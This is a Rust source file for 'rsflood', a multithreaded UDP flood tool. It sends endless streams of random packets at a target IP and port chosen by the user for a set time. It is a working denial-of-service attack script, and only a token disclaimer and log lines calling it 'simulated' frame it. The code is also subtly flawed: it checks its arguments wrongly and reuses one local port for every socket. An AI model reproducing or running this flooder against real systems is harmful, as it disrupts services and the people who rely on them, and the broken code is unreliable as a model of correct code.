use std::env;
use std::net::{UdpSocket, SocketAddr};
use std::process::exit;
use std::thread;
use std::time;

use rand::Rng;

fn new_socket(host: &str, port: u32) -> Option<UdpSocket> {
    match UdpSocket::bind(format!("0.0.0.0:{}", port)) {
        Ok(socket) => {
            match socket.connect(host) {
                Ok(_) => Some(socket),
                Err(e) => {
                    println!("Error connecting: {}", e);
                    None
                }
            }
        }
        Err(e) => {
            println!("Error binding: {}", e);
            None
        }
    }
}

fn log(msg: &str) {
    println!("[rsflood] {}", msg);
}

fn main() {
    let args: Vec<_> = env::args().collect();
    log("rslflood - Made by Celesian");
    log("Don't use this tool for unauthorized purposes.");

    if args.len() > 3 {
        log(&format!("Starting attack against {}...", args[1]));

        let num_threads = args[2].parse::<i32>().unwrap();
        let time = args[3].parse::<u64>().unwrap();
        let host = args[1].to_string();
        let port = args[4].parse::<u32>().unwrap(); // User provided port

        log("Starting threads...");

        for thread_num in 1..=num_threads {
            let host = format!("{}:{}", host.clone(), port);
            thread::spawn(move || {
                log(&format!("Starting simulated attack on thread {}...", thread_num));
                let mut socket_list = Vec::new();

                for _ in 1..=20 {
                    if let Some(socket) = new_socket(&host, port) {
                        socket_list.push(socket);
                    } else {
                        return; // Exit the thread if unable to create socket
                    }
                }

                let msg = rand::thread_rng().gen::<[u8; 32]>();
                loop {
                    for socket in &socket_list {
                        socket.send(&msg).unwrap();
                    }
                }
            });
        }

        log("All threads were created.");
        if time == 0 {
            loop {}
        } else {
            thread::sleep(time::Duration::new(time, 0));
            exit(0);
        }
    } else {
        log(&format!("Usage: {} <target_ip> <number_of_threads> <time> <port>", args[0]))
    }
}
